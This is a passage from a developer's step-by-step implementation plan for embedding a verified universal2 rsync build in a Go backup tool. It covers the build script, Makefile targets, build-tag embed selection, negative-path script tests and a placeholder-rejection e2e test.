    tar -xzf "${CACHE_DIR}/rsync-${RSYNC_VERSION}.tar.gz" -C "${SRC_DIR}" --strip-components=1
}

build_arch() {
    local arch="$1"
    local build_dir="$2"
    rm -rf "${build_dir}"
    mkdir -p "${build_dir}"

    (cd "${build_dir}" && \
     CC="clang -arch ${arch} -mmacosx-version-min=${MIN_MACOS}" \
     "${SRC_DIR}/configure" \
        --disable-openssl \
        --disable-zstd \
        --disable-lz4 \
        --disable-xxhash \
        --build="${arch}-apple-darwin" \
        --host="${arch}-apple-darwin")

    (cd "${build_dir}" && make -j"$(sysctl -n hw.ncpu)")
}

lipo_universal() {
    mkdir -p "$(dirname "${OUTPUT_PATH}")"
    lipo -create -output "${OUTPUT_PATH}" \
        "${ARM64_BUILD_DIR}/rsync" \
        "${AMD64_BUILD_DIR}/rsync"
    chmod 0755 "${OUTPUT_PATH}"
}
```

- [ ] **Step 3.6: Add the audit emitter, the linkage gate and main; then make it executable**

Append. The linkage assertion runs inside the script, not only in CI, so a local build fails the same way a CI build does.

```bash
assert_linkage() {
    local binary="$1"
    local arch="$2"
    local out
    out="$(otool -L -arch "${arch}" "${binary}")"
    # Match only the indented dylib path lines; the first line is the
    # binary's own name and must not be considered.
    if echo "${out}" | grep -E '^[[:space:]]+/' | grep -v 'libSystem\.B\.dylib' | grep -q '\.dylib'; then
        echo "FATAL: ${arch} links a non-libSystem dylib" >&2
        echo "${out}" >&2
        exit 1
    fi
}

emit_audit() {
    echo
    echo "=== build complete ==="
    if [[ ${SMOKE_MODE} -eq 1 ]]; then
        file "${ARM64_BUILD_DIR}/rsync"
        echo "SHA256: $(shasum -a 256 "${ARM64_BUILD_DIR}/rsync" | cut -d' ' -f1)"
        assert_linkage "${ARM64_BUILD_DIR}/rsync" "arm64"
        "${ARM64_BUILD_DIR}/rsync" --version | head -1
    else
        file "${OUTPUT_PATH}"
        echo "SHA256: $(shasum -a 256 "${OUTPUT_PATH}" | cut -d' ' -f1)"
        assert_linkage "${OUTPUT_PATH}" "arm64"
        assert_linkage "${OUTPUT_PATH}" "x86_64"
        otool -L -arch arm64 "${OUTPUT_PATH}"
        otool -L -arch x86_64 "${OUTPUT_PATH}"
        "${OUTPUT_PATH}" --version | head -1
    fi
}

main() {
    if [[ ${VERIFY_ONLY} -eq 1 ]]; then
        download_and_verify_tarball
        echo "verify-only mode: tarball SHA matches pin. No build performed."
        return
    fi
    download_and_verify_tarball
    extract_sources
    build_arch "arm64" "${ARM64_BUILD_DIR}"
    if [[ ${SMOKE_MODE} -eq 0 ]]; then
        build_arch "x86_64" "${AMD64_BUILD_DIR}"
        lipo_universal
    fi
    emit_audit
}

main "$@"
```

Then:

```bash
chmod +x scripts/build-rsync.sh
```

- [ ] **Step 3.7: Run verify-only, then a full build**

```bash
./scripts/build-rsync.sh --verify-only
```

Expected: `tarball downloaded + verified` then `verify-only mode: tarball SHA matches pin.` On the very first run the primary mirror does not exist yet (Task 13 creates it), so expect the "primary mirror unreachable; falling back to samba.org" line. That fallback is by design, not a failure.

```bash
time ./scripts/build-rsync.sh
```

Expected: `Mach-O universal binary with 2 architectures: [x86_64...] [arm64...]`, a SHA256 line, two `otool` blocks each showing only `/usr/lib/libSystem.B.dylib`, and `rsync  version 3.4.1  protocol version 32`. AC-12a-1 targets under 5 minutes on an M1 Max; record the actual wall-clock in the commit body.

- [ ] **Step 3.8: Assert the parse-don't-source acceptance criterion**

```bash
grep -cE '^[[:space:]]*(source|\.)[[:space:]]' scripts/build-rsync.sh
```

Expected: `0`. This is AC-12a-9.

- [ ] **Step 3.9: Run the gates and commit**

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add scripts/build-rsync.sh
git commit -F- <<'MSG'
feat(build): implement build-rsync.sh universal2 pipeline

Replaces the comment-only stub. Downloads the pinned tarball (GitHub
mirror primary, samba.org fallback), SHA256-verifies it, configures and
builds arm64 and x86_64 with optional features disabled, lipo-joins them,
and asserts linkage before emitting the audit block.

Hardening beyond the spec sketch:
- Exactly-one-match guard on each rsync.version key, so a second
  smuggled assignment line cannot slip past the anchored regex.
- A cached tarball failing its SHA is moved aside to .rejected and
  reported, rather than silently re-downloaded.
- assert_linkage runs in the script, so local builds fail the same way
  CI does rather than deferring the check to a workflow step.
- Prereq list extended with file, otool and sysctl, which the script
  actually invokes.

AC-12a-9: grep for sourced rsync.version returns 0.
Build wall-clock on M1 Max: <record it>

<paste the four gate outputs here>
MSG
```

---

## Task 4: Makefile targets and .gitignore

**Files:**
- Modify: `Makefile`
- Modify: `.gitignore`

**Interfaces:**
- Consumes: `scripts/build-rsync.sh` from Task 3.
- Produces: `make build-rsync`, `build-rsync-smoke`, `build-rsync-verify`, `build-real-rsync`, `clean-rsync`, `test-embed-placeholder`, `test-embed-real-rsync`.

- [ ] **Step 4.1: Extend the .PHONY line**

`Makefile:1` currently reads:

```makefile
.PHONY: build build-faultinject test test-pkg test-faultinject e2e-fast e2e-safety bench bench-baseline coverage verify-release snapshot-update lint ci-local debug-bundle clean
```

Append the seven new target names to that same line. Do not add a second `.PHONY` line.

- [ ] **Step 4.2: Add the targets**

Insert after the existing `build-faultinject` target block (which ends before `test:`). Do not modify `build` or `build-faultinject`.

```makefile
build-rsync:
	./scripts/build-rsync.sh

build-rsync-smoke:
	./scripts/build-rsync.sh --smoke

build-rsync-verify:
	./scripts/build-rsync.sh --verify-only

# build-real-rsync composes the existing release tag with embed_real_rsync
# and reuses LDFLAGS_RELEASE unchanged, so the produced binary differs from
# `make build` in exactly one respect: the embedded rsync payload.
build-real-rsync: build-rsync
	go build $(GOFLAGS) -tags 'release embed_real_rsync' -ldflags "$(LDFLAGS_RELEASE)" -o flashbackup ./cmd/flashbackup

clean-rsync:
	@rm -rf ./build
	@rm -f ./internal/rsync/bin/rsync.universal2
	@echo "removed: ./build/ and ./internal/rsync/bin/rsync.universal2"

test-embed-placeholder:
	FLASHBACKUP_E2E=1 go test -timeout=5m ./test/e2e/... -run TestE2E_PlaceholderRejection

test-embed-real-rsync: build-rsync
	FLASHBACKUP_E2E=1 go test -timeout=10m -tags 'release embed_real_rsync' ./test/e2e/... -run TestE2E_EmbeddedRealRsync
```

Two deviations from the spec's sketch, both required for the tests to run at all:

1. `FLASHBACKUP_E2E=1` is prepended to both test targets. Without it every e2e test calls `t.Skip` and the target reports success having executed nothing. This is the repository's most common silent-failure mode and the spec's sketch would have walked straight into it.
2. Test names are `TestE2E_PlaceholderRejection` and `TestE2E_EmbeddedRealRsync`, matching the existing `TestE2E_` prefix convention used by all twelve current e2e tests.

- [ ] **Step 4.3: Extend .gitignore**

Add under the existing "Build / test artifacts" block:

```
# Task 12a: generated rsync payload + its build tree. Root-anchored so a
# future non-root directory named build/ is unaffected.
/build/
internal/rsync/bin/rsync.universal2
```

- [ ] **Step 4.4: Verify the targets and the ignore rule**

```bash
make clean-rsync
make build-rsync-verify
make build-rsync && ls -la internal/rsync/bin/
git status --porcelain internal/rsync/bin/ build/
```

Expected: `clean-rsync` echoes what it removed; `build-rsync` produces `rsync.universal2`; `git status` shows **nothing** for either path, proving the ignore rules bite.

- [ ] **Step 4.5: Prove `make build` is unchanged (AC-12a-6)**

```bash
make build
./flashbackup --version
FLASHBACKUP_E2E=1 go test -count=1 -timeout=5m -run TestE2E_BackupHappy_CopyMode ./test/e2e/...
```

Expected: version line prints, and the happy-path e2e still passes. `make build` must still embed the placeholder at this point in the plan, because Task 5 has not yet added the tag-gated files.

- [ ] **Step 4.6: Run the gates and commit**

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add Makefile .gitignore
git commit -F- <<'MSG'
feat(build): Makefile targets for the real-rsync build path

Seven targets: build-rsync, build-rsync-smoke, build-rsync-verify,
build-real-rsync, clean-rsync, test-embed-placeholder,
test-embed-real-rsync. Existing build and build-faultinject untouched;
AC-12a-6 verified by re-running the happy-path e2e after `make build`.

Both test targets set FLASHBACKUP_E2E=1. Without it every e2e test
t.Skips and the target reports success having run nothing, which is the
exact silent-failure shape this task exists to gate against.

.gitignore takes /build/ (root-anchored) and the generated
internal/rsync/bin/rsync.universal2.

<paste the four gate outputs here>
MSG
```

---
## Task 5: Tag-gated embed swap

**Files:**
- Modify: `internal/rsync/rsync.go` (remove the `//go:embed` directive and the `var embeddedRsync` declaration)
- Create: `internal/rsync/embed_dev.go`
- Create: `internal/rsync/embed_release.go`
- Test: `internal/rsync/rsync_test.go`

**Interfaces:**
- Consumes: `internal/rsync/bin/rsync.universal2` from Task 3.
- Produces: `var embeddedRsync []byte` in package `rsync`, exactly one declaration in scope per build. `EmbeddedSHA256()` and `EnsureExtracted()` signatures are unchanged.

- [ ] **Step 5.1: Remove the declaration from `rsync.go`**

Delete these lines from `internal/rsync/rsync.go` (they currently sit at lines 16 to 24, immediately after the imports):

```go
// embeddedRsync is the raw payload built into the flashbackup binary.
// In Plan 1 / Task 12 this is a small shell-script placeholder
// (`bin/rsync.placeholder`). Task 12a's scripts/build-rsync.sh will replace
// the embedded file with a universal2 GNU rsync 3.4.1 binary; no Go-side
// change is required at that swap since EmbeddedSHA256 recomputes from the
// new bytes.
//
//go:embed bin/rsync.placeholder
var embeddedRsync []byte
```

Also remove `_ "embed"` from `rsync.go`'s import block: the embed directive has moved out of this file, and a blank embed import with no directive is dead weight the linter will flag.

Replace the deleted block with a pointer comment so a reader of `rsync.go` is not left wondering where the payload comes from:

```go
// embeddedRsync is declared in embed_dev.go (default) or
// embed_release.go (-tags embed_real_rsync). The two files carry
// mutually exclusive build constraints, so exactly one declaration is
// in scope at compile time. See Task 12a in
// docs/planning/2026-08-24-1729-task-12a-embedded-rsync-build-pipeline-v2.md.
```

- [ ] **Step 5.2: Create `internal/rsync/embed_dev.go`**

```go
//go:build !embed_real_rsync

package rsync

import _ "embed"

// embeddedRsync is the placeholder shell script. This is the DEFAULT
// payload: plain `go build`, `go test`, `go run` and the existing
// `make build` all land here. It prints a banner and exits 0 without
// transferring anything, which the Task 12b-A regression test pins.
//
//go:embed bin/rsync.placeholder
var embeddedRsync []byte
```

- [ ] **Step 5.3: Create `internal/rsync/embed_release.go`**

```go
//go:build embed_real_rsync

package rsync

import _ "embed"

// embeddedRsync is the real universal2 GNU rsync 3.4.1 binary produced by
// scripts/build-rsync.sh. The file is gitignored and absent from a fresh
// checkout, so this file only compiles after `make build-rsync` has run.
// A missing file surfaces at compile time as
// "pattern bin/rsync.universal2: no matching files found", which is the
// intended failure: it is louder than shipping a placeholder by accident.
//
//go:embed bin/rsync.universal2
var embeddedRsync []byte
```

- [ ] **Step 5.4: Write the tag-parity test**

Add to `internal/rsync/rsync_test.go`. This test compiles under both tag sets and asserts the payload is self-consistent, so neither build can ship an empty or truncated embed.

```go
// TestEmbeddedPayload_NonEmptyAndSelfConsistent asserts whichever payload
// is embedded is non-empty and that EmbeddedSHA256 actually hashes it.
// Runs under both tag sets; the assertion is deliberately payload-agnostic
// so one test covers dev and release builds.
func TestEmbeddedPayload_NonEmptyAndSelfConsistent(t *testing.T) {
	if len(embeddedRsync) == 0 {
		t.Fatal("embeddedRsync is empty; the go:embed directive matched nothing")
	}
	sum := sha256.Sum256(embeddedRsync)
	want := hex.EncodeToString(sum[:])
	if got := EmbeddedSHA256(); got != want {
		t.Errorf("EmbeddedSHA256: got %s want %s", got, want)
	}
}
```

Ensure the test file imports `crypto/sha256` and `encoding/hex`.

- [ ] **Step 5.5: Verify both tag paths compile and behave**

```bash
# Default path: placeholder.
go build ./... && go test -race -count=1 ./internal/rsync/

# Release path: requires the generated binary to exist.
make build-rsync
go build -tags 'release embed_real_rsync' ./... && \
  go test -race -count=1 -tags 'release embed_real_rsync' ./internal/rsync/
```

- [ ] **Step 5.6: Positive-control the failure mode**

A build that silently falls back to the placeholder is the exact accident this task prevents. Prove the guard fires:

```bash
make clean-rsync
go build -tags 'release embed_real_rsync' ./internal/rsync/ 2>&1 | head -3
```

Expected: a compile error naming `pattern bin/rsync.universal2: no matching files found`. If this **succeeds**, the tag files are wrong and the release build would ship a placeholder. Restore with `make build-rsync` afterwards.

- [ ] **Step 5.7: Prove the two builds differ**

```bash
make build-rsync
go build -o /tmp/fb-dev ./cmd/flashbackup
go build -tags 'release embed_real_rsync' -o /tmp/fb-real ./cmd/flashbackup
ls -la /tmp/fb-dev /tmp/fb-real
```

Expected: `/tmp/fb-real` is roughly 1 to 2 MB larger. Equal sizes mean the tag did not take effect.

- [ ] **Step 5.8: Run the gates and commit**

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add internal/rsync/rsync.go internal/rsync/embed_dev.go internal/rsync/embed_release.go internal/rsync/rsync_test.go
git commit -F- <<'MSG'
feat(rsync): build-tag selection between placeholder and real rsync

embeddedRsync moves out of rsync.go into two mutually exclusive
tag-gated files. Default builds keep the placeholder; -tags
embed_real_rsync selects the generated universal2 binary.

Positive control recorded: with the generated binary removed, the
release-tagged build fails to compile with "pattern
bin/rsync.universal2: no matching files found" rather than silently
falling back to the placeholder. Binary size delta confirms the tag
takes effect.

<paste the four gate outputs here>
MSG
```

---

## Task 6: Negative-path tests for the build script

Spec §6 requires four script-level negative tests. A build script that only ever gets exercised on the happy path is a script whose error handling is decorative.

**Files:**
- Create: `scripts/build-rsync.test.sh`

**Interfaces:**
- Consumes: `scripts/build-rsync.sh` and `scripts/rsync.version`.
- Produces: a standalone test runner. Exit 0 means all four scenarios behaved.

- [ ] **Step 6.1: Write the harness**

```bash
#!/bin/bash
# scripts/build-rsync.test.sh: negative-path tests for build-rsync.sh.
#
# Each scenario asserts the script FAILS in the documented way. A script
# whose error paths are never exercised is a script whose error paths do
# not work. Run from the repo root: ./scripts/build-rsync.test.sh
#
# These tests mutate ./build/cache. Run `make clean-rsync` afterwards
# before any release build, so a rejected or bit-flipped tarball cannot
# leak into a real artifact.
set -uo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "${REPO_ROOT}"

PASS=0
FAIL=0

expect_fail() {
    local name="$1"; shift
    local want_marker="$1"; shift
    local out rc
    out="$("$@" 2>&1)"; rc=$?
    if [[ ${rc} -eq 0 ]]; then
        echo "FAIL: ${name}: expected non-zero exit, got 0"
        echo "${out}" | sed 's/^/    /'
        FAIL=$((FAIL + 1))
        return
    fi
    if ! echo "${out}" | grep -q "${want_marker}"; then
        echo "FAIL: ${name}: exit ${rc} but marker '${want_marker}' absent"
        echo "${out}" | sed 's/^/    /'
        FAIL=$((FAIL + 1))
        return
    fi
    echo "PASS: ${name} (exit ${rc}, marker matched)"
    PASS=$((PASS + 1))
}
```

- [ ] **Step 6.2: Add scenario 1, tarball SHA mismatch**

Planting a corrupt file in the cache does NOT work here: the script moves a failing cached file aside and re-downloads the real one, which then verifies, so the scenario would pass for the wrong reason. Temporarily swap in a wrong pin instead, so no download can ever satisfy it:

```bash
scenario_sha_mismatch() {
    local tmpver
    tmpver="$(mktemp -d)/rsync.version"
    cp scripts/rsync.version "${tmpver}"
    # A syntactically valid but wrong SHA: 64 hex chars that will never match.
    sed -i '' -E 's/^RSYNC_TARBALL_SHA256=.*/RSYNC_TARBALL_SHA256=00000000000000000000000000000000000000000000000000000000deadbeef/' "${tmpver}"
    cp scripts/rsync.version scripts/rsync.version.bak
    cp "${tmpver}" scripts/rsync.version
    expect_fail "sha-mismatch" "SHA256 mismatch" ./scripts/build-rsync.sh --verify-only
    mv scripts/rsync.version.bak scripts/rsync.version
    rm -f build/cache/*.tmp build/cache/*.rejected
}
```

- [ ] **Step 6.3: Add scenario 2, missing prerequisite**

```bash
scenario_missing_prereq() {
    # Run with a PATH that has no clang. The script exports its own PATH
    # at entry, so the stripping must happen via a shim dir that shadows
    # /usr/bin/clang: create a dir with a non-executable clang and put it
    # first via a wrapper that re-exports PATH after the script's own
    # export cannot be defeated. Simplest reliable form: invoke the
    # prereq loop in isolation with a stubbed command builtin.
    local probe
    probe="$(mktemp)"
    cat > "${probe}" <<'PROBE'
#!/bin/bash
set -euo pipefail
export PATH="/nonexistent"
for tool in clang lipo shasum curl tar make grep cut file otool sysctl; do
    if ! command -v "${tool}" >/dev/null; then
        echo "FATAL: required tool '${tool}' not on PATH" >&2
        exit 1
    fi
done
PROBE
    chmod +x "${probe}"
    expect_fail "missing-prereq" "required tool" "${probe}"
    rm -f "${probe}"
}
```

This scenario tests the prereq loop's logic rather than the whole script, because `build-rsync.sh` hard-exports a known-good PATH at entry and therefore cannot be starved from outside. Record that limitation in the file header: the test proves the loop rejects a missing tool, not that the script is immune to PATH tampering (the export is what provides that, and it is asserted by reading the script, not by executing it).

- [ ] **Step 6.4: Add scenario 3, corrupted cache detected loudly**

```bash
scenario_corrupt_cache() {
    local ver tarball
    ver="$(grep -E '^RSYNC_VERSION=' scripts/rsync.version | cut -d= -f2)"
    tarball="build/cache/rsync-${ver}.tar.gz"
    # Ensure a good cached tarball exists first.
    ./scripts/build-rsync.sh --verify-only >/dev/null 2>&1 || {
        echo "SKIP: corrupt-cache (no network to seed the cache)"; return
    }
    # Bit-flip one byte in the middle.
    local size
    size=$(stat -f%z "${tarball}")
    printf '\x00' | dd of="${tarball}" bs=1 seek=$((size / 2)) count=1 conv=notrunc 2>/dev/null
    local out
    out="$(./scripts/build-rsync.sh --verify-only 2>&1)"
    if echo "${out}" | grep -q "cached tarball failed SHA256 verification"; then
        echo "PASS: corrupt-cache (detected and reported)"
        PASS=$((PASS + 1))
    else
        echo "FAIL: corrupt-cache: corruption was not reported"
        echo "${out}" | sed 's/^/    /'
        FAIL=$((FAIL + 1))
    fi
    rm -f "${tarball}.rejected"
}
```

- [ ] **Step 6.5: Add scenario 4, partial-make recovery, and the summary**

```bash
scenario_partial_make_recovery() {
    # Simulate an interrupted build by leaving a half-populated arch dir,
    # then assert the next run recovers. build_arch rm -rf's its own dir
    # at entry, so recovery is structural rather than best-effort.
    mkdir -p build/arm64
    printf 'garbage' > build/arm64/rsync
    printf 'garbage' > build/arm64/config.log
    if ./scripts/build-rsync.sh --smoke >/dev/null 2>&1; then
        if file build/arm64/rsync | grep -q 'Mach-O'; then
            echo "PASS: partial-make-recovery (clean rebuild over debris)"
            PASS=$((PASS + 1))
        else
            echo "FAIL: partial-make-recovery: output is not a Mach-O binary"
            FAIL=$((FAIL + 1))
        fi
    else
        echo "FAIL: partial-make-recovery: rebuild over debris failed"
        FAIL=$((FAIL + 1))
    fi
}

scenario_sha_mismatch
scenario_missing_prereq
scenario_corrupt_cache
scenario_partial_make_recovery

echo
echo "=== build-rsync.test.sh: ${PASS} passed, ${FAIL} failed ==="
[[ ${FAIL} -eq 0 ]] || exit 1
```

- [ ] **Step 6.6: Run it, then clean the polluted cache**

```bash
chmod +x scripts/build-rsync.test.sh
./scripts/build-rsync.test.sh
make clean-rsync
```

Expected: four PASS lines (or three plus one SKIP when offline) and exit 0. The `make clean-rsync` is mandatory: these scenarios deliberately corrupt `build/cache`, and the review flagged cache pollution leaking into a later release build as a real risk.

- [ ] **Step 6.7: Run the gates and commit**

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add scripts/build-rsync.test.sh
git commit -F- <<'MSG'
test(build): negative-path tests for build-rsync.sh

Four scenarios per spec section 6: tarball SHA mismatch, missing
prerequisite, corrupted cache, partial-make recovery.

Documented limitation: the missing-prereq scenario exercises the prereq
loop in isolation rather than the whole script, because build-rsync.sh
hard-exports a known-good PATH at entry and cannot be starved from
outside. The PATH export is verified by reading the script, not by
executing it; the test proves the loop rejects a missing tool.

The scenarios corrupt build/cache by design. make clean-rsync runs at
the end and must run before any release build.

<paste the four gate outputs here>
MSG
```

---
## Task 7: Task 12b-A, placeholder rejection regression test

This test pins the behaviour that let the Task 12a blocker reach a tagged release: a default build transfers nothing, and nothing in CI noticed. Every existing e2e test sets `FLASHBACKUP_RSYNC_PATH_FOR_TEST`, so the placeholder path was never executed end-to-end.

**The assertions below were verified by running them on Mon, 24 Aug 2026.** A throwaway probe produced exit code 1, `exit_status: "partial"`, `files_succeeded: 0`, `files_failed: 3`, `files_total: 3`, and an `rsync.log` containing exactly `PLACEHOLDER rsync; awaiting Task 12a build`. This test is that probe, made permanent.

**Files:**
- Create: `test/e2e/placeholder_rejection_test.go`

**Interfaces:**
- Consumes: `SetupUSB`, `SeedSource`, `SeedProfile`, `RunBackup`, `AssertRunsNDJSONHasFinishedLine` (signatures in Verified ground truth above).
- Produces: `TestE2E_PlaceholderRejection`, matched by `make test-embed-placeholder`.

- [ ] **Step 7.1: Write the test**

```go
package e2e

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/maheshmirchandani/Backup-Pro/internal/testutil"
)

// placeholder_rejection_test.go covers AC-12b-1. It is the ONLY e2e test
// that deliberately does NOT set FLASHBACKUP_RSYNC_PATH_FOR_TEST: it runs
// the default build against its own embedded payload, which is the
// placeholder shell script.
//
// Why this exists: v0.1.0-core shipped a binary that transferred zero
// bytes on a clean install, and CI was green throughout, because every
// other e2e test injects a real GNU rsync via the env seam. This test
// closes that hole. Once Task 12a lands a real embedded rsync, this test
// still guards the DEFAULT build, which keeps the placeholder by design
// so `go test` and `make build` stay fast and hermetic.
//
// Verified behaviour (Mon, 24 Aug 2026, tiny fixture, no override):
//   exit code 1, exit_status "partial", files_total 3, files_succeeded 0,
//   files_failed 3, rsync.log == "PLACEHOLDER rsync; awaiting Task 12a build".
//
// NOTE on the spec: AC-12b-1 asks for bytes_transferred == 0. No such
// field exists. state.FinishedRun carries BytesTotal, which is the
// ENUMERATED byte count and is non-zero (20) even here. The equivalent
// assertion is files_succeeded == 0 with files_failed == files_total.
func TestE2E_PlaceholderRejection(t *testing.T) {
	testutil.RequireE2E(t)
	testutil.RequireMacOS(t)
	testutil.RequireHdiutil(t)
	testutil.RequireDiskutil(t)

	// Guard against an ambient override leaking in from the shell. Without
	// this, a developer with the var exported would see this test pass for
	// entirely the wrong reason: a real rsync would transfer the files and
	// the "placeholder" assertions would be measuring something else.
	if v := os.Getenv("FLASHBACKUP_RSYNC_PATH_FOR_TEST"); v != "" {
		t.Fatalf("this test requires NO rsync override; FLASHBACKUP_RSYNC_PATH_FOR_TEST=%q", v)
	}

	usb := SetupUSB(t, 64)
	source := SeedSource(t, "tiny")
	SeedProfile(t, usb, "placeholder-guard", source, []string{"*"}, nil)

	exitCode, stdout, stderr := RunBackup(t, "placeholder-guard", usb)
	if exitCode != 1 {
		t.Fatalf("exit code: got %d want 1\nstdout: %s\nstderr: %s", exitCode, stdout, stderr)
	}

	runID := AssertRunsNDJSONHasFinishedLine(t, usb)

	runsData, err := os.ReadFile(filepath.Join(usb, ".flashbackup", "runs.ndjson"))
	if err != nil {
		t.Fatalf("read runs.ndjson: %v", err)
	}
	lines := strings.Split(strings.TrimRight(string(runsData), "\n"), "\n")
	var finished struct {
		ExitStatus     string `json:"exit_status"`
		FilesTotal     int    `json:"files_total"`
		FilesSucceeded int    `json:"files_succeeded"`
		FilesFailed    int    `json:"files_failed"`
	}
	if err := json.Unmarshal([]byte(lines[len(lines)-1]), &finished); err != nil {
		t.Fatalf("unmarshal finished line: %v", err)
	}
	if finished.ExitStatus != "partial" {
		t.Errorf("exit_status: got %q want %q", finished.ExitStatus, "partial")
	}
	if finished.FilesSucceeded != 0 {
		t.Errorf("files_succeeded: got %d want 0", finished.FilesSucceeded)
	}
	if finished.FilesTotal == 0 {
		t.Fatal("files_total is 0; the fixture seeded nothing and the test proves nothing")
	}
	if finished.FilesFailed != finished.FilesTotal {
		t.Errorf("files_failed: got %d want %d (all files)", finished.FilesFailed, finished.FilesTotal)
	}

	// The marker proves extract-then-exec actually happened. Without it,
	// a run that never launched rsync at all would produce identical
	// counters, and this test would pass while measuring nothing.
	logPath := filepath.Join(usb, ".flashbackup", "runs", runID, "rsync.log")
	logData, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatalf("read rsync.log at %s: %v", logPath, err)
	}
	if !strings.Contains(string(logData), "PLACEHOLDER rsync") {
		t.Errorf("rsync.log lacks the PLACEHOLDER marker; extract-then-exec may not have run.\ngot: %q", logData)
	}
}
```

The `files_total == 0` guard is deliberate. Without it, a fixture that seeded nothing would satisfy `files_succeeded == 0` and `files_failed == files_total` trivially, and the test would report success having verified nothing.

- [ ] **Step 7.2: Run it**

```bash
make test-embed-placeholder
```

Expected: PASS in roughly 4 seconds.

- [ ] **Step 7.3: Positive-control the test**

Prove the test can fail. Temporarily inject a real rsync and confirm it reports failure:

```bash
FLASHBACKUP_RSYNC_PATH_FOR_TEST=/opt/homebrew/bin/rsync FLASHBACKUP_E2E=1 \
  go test -count=1 -run TestE2E_PlaceholderRejection ./test/e2e/... 2>&1 | tail -5
```

Expected: FAIL on the ambient-override guard. Record the output in the commit body. A test that has never been observed failing is not yet a test.

- [ ] **Step 7.4: Run the gates and commit**

```bash
go vet ./... && gofmt -s -l . && go test -race -count=1 ./... && make coverage
git add test/e2e/placeholder_rejection_test.go
git commit -F- <<'MSG'
test(e2e): placeholder rejection guard [Task 12b-A]

The only e2e test that runs WITHOUT the rsync env override, closing the
hole that let v0.1.0-core ship a binary transferring zero bytes with CI
green throughout.

Asserts exit 1, exit_status partial, files_succeeded 0, files_failed ==
files_total, and the PLACEHOLDER marker in rsync.log (which proves
extract-then-exec ran rather than the run skipping rsync entirely).

Spec deviation, documented inline: AC-12b-1 asks for bytes_transferred
== 0 but state.FinishedRun has no such field. BytesTotal is the
enumerated count and is non-zero even here. Substituted
files_succeeded/files_failed, plus a files_total > 0 guard so an empty
fixture cannot satisfy the assertions vacuously.

Positive control: with a real rsync injected, the test fails as
expected.

<paste the four gate outputs here>
MSG
```

---

## Task 8: Extend the pathological fixture with xattr and ACL members

**Files:**
- Modify: `test/fixtures/pathological/mkfixtures.sh`
- Modify: `test/fixtures/pathological/MANIFEST.txt`
- Modify: `test/e2e/assertions.go` (`FixtureTreeSHA256` exclusion)
- Modify: `test/e2e/helpers_test.go` (add the missing tripwire)

**Interfaces:**
- Produces: fixture members `xattr-target.txt` (carrying `user.flashbackup-test`) and `acl-target.txt` (carrying an ACL for the generation-time user, recorded in the `acl-target.user` sidecar). Consumed by Task 9.

Two determinism defects must not be reproduced here. The review found both in plan v1's version of this task.

**Defect 1: `smoke-value-$(date +%s)` as the xattr value.** The xattr value does not enter `FixtureTreeSHA256` (that helper hashes relative path plus file content only, per `test/e2e/assertions.go:101-148`), so this would not have broken the tree hash. It is still wrong: it makes the fixture non-reproducible and a failure message unreadable. Use a static value.

**Defect 2: `$(whoami)` written into the `acl-target.user` sidecar.** This one is real and does break the tree hash, because the sidecar is a regular file whose *content* differs per machine: `maheshm` locally, `runner` in CI. The recorded `SHA256-of-tree` would be unreproducible across hosts.

Resolution, per the review's option (a): keep the sidecar, and exclude it from `FixtureTreeSHA256`. A fixed sentinel username is not viable, because `chmod +a` requires a user that actually exists on the box.

- [ ] **Step 8.1: Add the exclusion to `FixtureTreeSHA256`**

In `test/e2e/assertions.go`, the walk currently skips only `MANIFEST.txt`:

```go
		if d.Name() == "MANIFEST.txt" {
			return nil
		}
```

Replace with:

```go
		if isFixtureMetadata(d.Name()) {
			return nil
		}
```

and add above `FixtureTreeSHA256`:

```go
// fixtureMetadataNames are fixture files that carry GENERATED metadata
// rather than fixture content, and are therefore excluded from the tree
// hash. Their contents vary per host by design, so including them would
// make the recorded SHA256-of-tree unreproducible.
//
//	MANIFEST.txt      fixture documentation, not a source-tree member
//	acl-target.user   the generation-time username, needed by Task 12b-B
//	                  to compare ACL semantics without hardcoding a name
var fixtureMetadataNames = map[string]bool{
	"MANIFEST.txt":    true,
	"acl-target.user": true,
}

func isFixtureMetadata(name string) bool {
	return fixtureMetadataNames[name]
}
```

- [ ] **Step 8.2: Extend `mkfixtures.sh`**

Append before the closing `echo`, after the `plain.txt` block:

```bash
# --- (g) xattr-bearing file ----------------------------------------------
# Written in place, with the xattr applied immediately at the final
# location: no copy, tar or mv afterwards, because every one of those
# operations can silently drop extended attributes. The value is STATIC.
# A timestamp here would make the fixture unreproducible and the failure
# messages unreadable, for no gain: the xattr value is not part of the
# tree hash (that hashes path + content only).
printf 'xattr target content\n' > "$dest/xattr-target.txt"
xattr -w user.flashbackup-test smoke-value-fixed "$dest/xattr-target.txt"

# --- (h) ACL-bearing file ------------------------------------------------
# chmod +a needs a user that exists on this box, so the fixture cannot use
# a fixed sentinel name. The generation-time user is recorded in a sidecar
# so the consuming test compares ACL semantics without hardcoding either
# "maheshm" or "runner". The sidecar is excluded from FixtureTreeSHA256
# (see fixtureMetadataNames in test/e2e/assertions.go) precisely because
# its content is host-dependent.
printf 'acl target content\n' > "$dest/acl-target.txt"
acl_user="$(whoami)"
printf '%s\n' "$acl_user" > "$dest/acl-target.user"
chmod +a "user:${acl_user} allow read" "$dest/acl-target.txt"
```

- [ ] **Step 8.3: Re-baseline the manifest**

```bash
./test/fixtures/regen-manifest.sh
```

Note the printed `pathological:` value. **`regen-manifest.sh` does not know about the exclusion added in Step 8.1**, so its shell-side recipe will include `acl-target.user` and disagree with the Go helper. Fix the script to match: in `compute_tree_sha`, change

```bash
        | LC_ALL=C find . -type f ! -name MANIFEST.txt -print0 \
```

to

```bash
        | LC_ALL=C find . -type f ! -name MANIFEST.txt ! -name acl-target.user -print0 \
```

Re-run `regen-manifest.sh` and update the `SHA256-of-tree:` line in `test/fixtures/pathological/MANIFEST.txt` with the new value. Also update the `File count:` line (8 becomes 11: three new files, of which one is excluded from the hash but still present on disk) and add inventory rows:

```
  xattr-target.txt             21 bytes   carries xattr user.flashbackup-test
                                          = smoke-value-fixed; consumed by
                                          Task 12b-B xattr survival check
  acl-target.txt               19 bytes   carries an ACL entry
                                          "user:<gen-time-user> allow read"
